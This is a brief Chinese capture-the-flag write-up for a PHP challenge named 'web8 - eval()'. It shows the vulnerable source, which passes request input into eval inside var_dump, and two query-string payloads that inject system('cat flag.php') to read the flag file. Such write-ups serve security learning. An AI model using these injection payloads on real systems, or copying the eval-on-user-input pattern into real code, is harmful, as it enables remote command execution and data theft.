# web8 - eval()

即使被var_dump包住了，也会先执行它里面的php语句。

payload:
`?hello=system('cat flag.php')`
或
`?hello=eval("system('cat flag.php');")`


题目源码：
```php
 <?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?> 
```